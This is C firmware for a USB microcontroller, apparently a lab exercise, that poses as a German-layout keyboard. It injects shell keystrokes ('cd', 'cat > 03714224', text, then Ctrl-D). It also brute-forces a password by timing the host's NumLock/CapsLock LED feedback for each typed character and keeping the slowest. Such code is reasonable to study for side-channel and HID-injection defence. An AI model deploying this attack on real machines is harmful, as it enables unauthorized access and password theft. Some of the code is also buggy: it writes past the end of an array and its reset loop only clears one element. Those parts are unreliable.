
#include "KeyboardHID.h"
#include "german_keyboardCodes.h"

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0
#define TICKS_PER_SECOND 1000
#define TICKS_WAIT 200
/* Systick */
void SysTick_Handler(void);
uint8_t FindMax(int);
uint8_t ChooseModi(uint8_t);
uint8_t passwordHacked = 1;
uint8_t indexToSend = 0;

uint32_t timeMeasured[12];
uint32_t timeNumOn[96];
uint32_t timeNumOff[96];
uint32_t timeCapsOn[24];
uint32_t timeCapsOff[24];
uint32_t finalPassword[20];
//static uint8_t stringToSend[20];// = {
static uint8_t indexNumOn =0;
static uint8_t indexNumOff =0;
static uint8_t indexCapsOn =0;
static uint8_t indexCapsOff =0;
static uint8_t indexFinalPassword =0;

static uint32_t ticks = 0;


// array of all charactes
// no  :  1-26,
// shift : 27-52,
// no    : 53-62
// shift : 63-65,
// no    :    66,
// shift :    67,
// no    :    68,
// shift :    69,
// Alt   :    70,
// shift : 71-72,
// no    : 73-75,
// shift :    76,
// ALT   : 77-80,
// shift : 81-84

static uint8_t stringAllChar[90]={
GERMAN_KEYBOARD_SC_A,
GERMAN_KEYBOARD_SC_B,
GERMAN_KEYBOARD_SC_C,
GERMAN_KEYBOARD_SC_D,
GERMAN_KEYBOARD_SC_E,
GERMAN_KEYBOARD_SC_F,
GERMAN_KEYBOARD_SC_G,
GERMAN_KEYBOARD_SC_H,
GERMAN_KEYBOARD_SC_I,
GERMAN_KEYBOARD_SC_J,
GERMAN_KEYBOARD_SC_K,
GERMAN_KEYBOARD_SC_L,
GERMAN_KEYBOARD_SC_M,
GERMAN_KEYBOARD_SC_N,
GERMAN_KEYBOARD_SC_O,
GERMAN_KEYBOARD_SC_P,
GERMAN_KEYBOARD_SC_Q,
GERMAN_KEYBOARD_SC_R,
GERMAN_KEYBOARD_SC_S,
GERMAN_KEYBOARD_SC_T,
GERMAN_KEYBOARD_SC_U,
GERMAN_KEYBOARD_SC_V,
GERMAN_KEYBOARD_SC_W,
GERMAN_KEYBOARD_SC_X,
GERMAN_KEYBOARD_SC_Y,
GERMAN_KEYBOARD_SC_Z,
// capital letters
GERMAN_KEYBOARD_SC_A,
GERMAN_KEYBOARD_SC_B,
GERMAN_KEYBOARD_SC_C,
GERMAN_KEYBOARD_SC_D,
GERMAN_KEYBOARD_SC_E,
GERMAN_KEYBOARD_SC_F,
GERMAN_KEYBOARD_SC_G,
GERMAN_KEYBOARD_SC_H,
GERMAN_KEYBOARD_SC_I,
GERMAN_KEYBOARD_SC_J,
GERMAN_KEYBOARD_SC_K,
GERMAN_KEYBOARD_SC_L,
GERMAN_KEYBOARD_SC_M,
GERMAN_KEYBOARD_SC_N,
GERMAN_KEYBOARD_SC_O,
GERMAN_KEYBOARD_SC_P,
GERMAN_KEYBOARD_SC_Q,
GERMAN_KEYBOARD_SC_R,
GERMAN_KEYBOARD_SC_S,
GERMAN_KEYBOARD_SC_T,
GERMAN_KEYBOARD_SC_U,
GERMAN_KEYBOARD_SC_V,
GERMAN_KEYBOARD_SC_W,
GERMAN_KEYBOARD_SC_X,
GERMAN_KEYBOARD_SC_Y,
GERMAN_KEYBOARD_SC_Z,
// numbers
GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION,
GERMAN_KEYBOARD_SC_2_AND_QUOTES,
GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,
GERMAN_KEYBOARD_SC_4_AND_DOLLAR,
GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE,
GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,
GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET,
GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
//special charactes - use shift
GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION,
GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET,
GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
//special charactes
GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE,
//special charactes - use shift
GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE,
//special charactes -
GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE,
//special charactes - use shift
GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
//special charactes - use left Alt
GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE,
//special charactes - use Shift
GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON,
GERMAN_KEYBOARD_SC_DOT_AND_COLON,
//special charactes -
GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON,
GERMAN_KEYBOARD_SC_DOT_AND_COLON,
GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,
//special charactes - use Shift
GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,
//special charactes - use left Alt
GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET,
GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
//special charactes - use Shift
GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH,
GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,
GERMAN_KEYBOARD_SC_4_AND_DOLLAR
};

/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

void SystemCoreClockSetup(void);

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {
	/* System timer configuration */
	SysTick_Config(SystemCoreClock / TICKS_PER_SECOND);

	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();

	// Wait until host has enumerated HID device
	for(int i = 0; i < 10e6; ++i)
		;


	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
	static uint8_t characterSent = 0,
					 IndexAlphabet =0,
					 indexMod=0;

	// modifire array
  static uint8_t modArray[4]={0,HID_KEYBOARD_MODIFIER_RIGHTSHIFT,HID_KEYBOARD_MODIFIER_RIGHTALT, HID_KEYBOARD_MODIFIER_LEFTCTRL};

	// string to be sent
	static uint8_t stringToSend[2][28];


	if (passwordHacked == 1) {

		indexFinalPassword = 28;
		stringToSend[0][0] =	GERMAN_KEYBOARD_SC_C;
		stringToSend[1][0] =	ChooseModi(2);
		stringToSend[0][1] = GERMAN_KEYBOARD_SC_D;
		stringToSend[1][1] =	ChooseModi(3);
		stringToSend[0][2] =	GERMAN_KEYBOARD_SC_ENTER;
		stringToSend[1][2] =	0;

		stringToSend[0][3] = GERMAN_KEYBOARD_SC_C;
		stringToSend[1][3] =	ChooseModi(2);
		stringToSend[0][4] = GERMAN_KEYBOARD_SC_A;
		stringToSend[1][4] =	ChooseModi(0);
		stringToSend[0][5] = GERMAN_KEYBOARD_SC_T;
		stringToSend[1][5] =	0;
		stringToSend[0][6] =  GERMAN_KEYBOARD_SC_SPACE;
		stringToSend[1][6] =	0;
		stringToSend[0][7] =	GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,
		stringToSend[1][7] =	1;

		stringToSend[0][8] =  GERMAN_KEYBOARD_SC_SPACE;
		stringToSend[1][8] =	0;

		stringToSend[0][9] =	GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
		stringToSend[1][9] =	0;
		stringToSend[0][10] =	GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH;
		stringToSend[1][10] =	0;
		stringToSend[0][11] =	GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		stringToSend[1][11] =	0;
		stringToSend[0][12] =	GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
		stringToSend[1][12] =	0;
		stringToSend[0][13] =	GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
		stringToSend[1][13] =	0;
		stringToSend[0][14] =	GERMAN_KEYBOARD_SC_2_AND_QUOTES;
		stringToSend[1][14] =	0;
		stringToSend[0][15] =	GERMAN_KEYBOARD_SC_2_AND_QUOTES;
		stringToSend[1][15] =	0;
		stringToSend[0][16] =	GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
		stringToSend[1][16] =	0;
		stringToSend[0][17] =	GERMAN_KEYBOARD_SC_ENTER;
		stringToSend[1][17] =	0;

		stringToSend[0][18] = GERMAN_KEYBOARD_SC_M;
		stringToSend[1][18] =	0;
		stringToSend[0][19] = GERMAN_KEYBOARD_SC_I;
		stringToSend[1][19] =	0;
		stringToSend[0][20] = GERMAN_KEYBOARD_SC_C;
		stringToSend[1][20] =	0;
		stringToSend[0][21] = GERMAN_KEYBOARD_SC_H;
		stringToSend[1][21] =	0;
		stringToSend[0][22] = GERMAN_KEYBOARD_SC_A;
		stringToSend[1][22] =	0;
		stringToSend[0][23] = GERMAN_KEYBOARD_SC_E;
		stringToSend[1][23] =	0;
		stringToSend[0][24] = GERMAN_KEYBOARD_SC_L;
		stringToSend[1][24] =	0;
		stringToSend[0][25] = GERMAN_KEYBOARD_SC_SPACE;
		stringToSend[1][25] =	0;
		stringToSend[0][26] = GERMAN_KEYBOARD_SC_T;
		stringToSend[1][26] =	0;

		stringToSend[0][27] =	GERMAN_KEYBOARD_SC_ENTER;
		stringToSend[1][27] =	0;
		stringToSend[0][28] =	GERMAN_KEYBOARD_SC_D;
		stringToSend[1][28] =	3; //ChooseModi(2);//
		if (indexToSend >28) {
					passwordHacked ++;
		}

	} else if(passwordHacked == 0){

	stringToSend[0][indexFinalPassword] =	stringAllChar[IndexAlphabet];
	stringToSend[1][indexFinalPassword] =	ChooseModi(IndexAlphabet);
	stringToSend[0][indexFinalPassword+1] =	GERMAN_KEYBOARD_SC_ENTER;
	stringToSend[1][indexFinalPassword+1] = 0;
	stringToSend[0][indexFinalPassword+2] =	0;
	stringToSend[1][indexFinalPassword+2] =	0;
} else {

	indexFinalPassword = 29;
	for (size_t i = 0; i < 29; i++) {
			stringToSend[0][0] =	0;
			stringToSend[1][0] =	0;
	}
	return 0;

}

	if(indexToSend <= (indexFinalPassword+1)) {

		if(characterSent) {
			report->Modifier = 0;
			report->Reserved = 0;
			report->KeyCode[0] = 0;
			characterSent = 0;
	//		timeMeasured[indexToSend]=ticks;
			++indexToSend;
		} else {
			report->Modifier = modArray[stringToSend[1][indexToSend]];
			report->Reserved = 0;
			report->KeyCode[0] = stringToSend[0][indexToSend];
			characterSent = 1;
		//	ticks = 0
		}
	} else if(IndexAlphabet <=84){
		// indexNumOn  = 0;
		// indexNumOff = 0;indexToSend =21;

		indexCapsOn = 0;
		indexCapsOff= 0;
		indexToSend = 0;
		IndexAlphabet++;
		indexMod = ChooseModi(IndexAlphabet);

	} else // end of transMission (one char of the password)
	{		//IndexAlphabet =0;
		//indexMod=0;
		indexToSend =indexFinalPassword+2;
		if (indexNumOn >= IndexAlphabet) {
			finalPassword[indexFinalPassword]=FindMax(indexNumOn);

			stringToSend[0][indexFinalPassword]=stringAllChar[finalPassword[indexFinalPassword]];
			stringToSend[1][indexFinalPassword]=ChooseModi(finalPassword[indexFinalPassword]);
			indexFinalPassword++;
			indexNumOn =0;
			indexNumOff =0;
			indexToSend =0;
			IndexAlphabet=0;
			indexMod = ChooseModi(IndexAlphabet);
			if (indexFinalPassword>=2) { // stop the seach for password
				indexToSend =indexFinalPassword+2;
			}
		}
	}


	return true;
}

// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;

	if(*report & HID_KEYBOARD_LED_NUMLOCK)
		{XMC_GPIO_SetOutputHigh(LED1);
		timeNumOn[indexNumOn]=ticks; //end time of string
		indexNumOn++;}
	else
		{XMC_GPIO_SetOutputLow(LED1);
		timeNumOff[indexNumOff]=ticks;// starte time of string
		indexNumOff++;
		// if(indexNumOff == 3)
		// 	{
		// 		int loop;
		// 		for(loop = 0; loop < 3; loop++)
	  //     {
		// 			//printf("%d ", timeNumOff[loop]);//printf("%d\n%d\n%d\n", timeNumOff[0], timeNumOff[1], timeNumOff[2]);}
		// 		}
 		// 	}
		}
	if(*report & HID_KEYBOARD_LED_CAPSLOCK)
		{XMC_GPIO_SetOutputHigh(LED2);
		timeCapsOn[indexCapsOn]=ticks;
		indexCapsOn++;
		//passwordHacked =1;
		indexToSend = 0;
		}
	else
		{XMC_GPIO_SetOutputLow(LED2);
		timeCapsOff[indexCapsOff]=ticks;
		indexCapsOff++;
		}
}

void SystemCoreClockSetup(void) {
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}

void SysTick_Handler(void)
{  //static uint32_t ticks = 0;

  ticks++;
}

uint8_t FindMax(int count){ // count is the number of elements in timeNumOn or timeCapsOff
	uint32_t transTime[count];
	uint8_t LongestTrans=0;
	uint8_t offset = 0;
	if (indexFinalPassword == 0) {
		offset =1;
	} else {offset=0;}
	for (size_t i = 0; i < count; i++) {
		transTime[i] = timeNumOn[i+offset]- timeNumOff[i+offset]; // not shure if transTime is offset by 1, if not don't subtract 1
		if (transTime[i] > transTime[LongestTrans]) {
			LongestTrans = i;
		}//Ye-s:xpqTP

	}
return (LongestTrans);

}

uint8_t ChooseModi(uint8_t indexAlphabet){
	uint8_t indexModi;

	if ( (indexAlphabet <=25)||
			 (indexAlphabet >=52 && indexAlphabet <=61)||
			 (indexAlphabet ==65)||
			 (indexAlphabet ==67)||
			 (indexAlphabet >=72 && indexAlphabet <=74)			) // no
			{
				indexModi = 0;
			} else if (indexAlphabet==69 ||
				(indexAlphabet >=76 && indexAlphabet <=79)) // alt gr
			{
				indexModi = 2;
			} else // shift
			{
				indexModi = 1;
			}

	return indexModi;
}
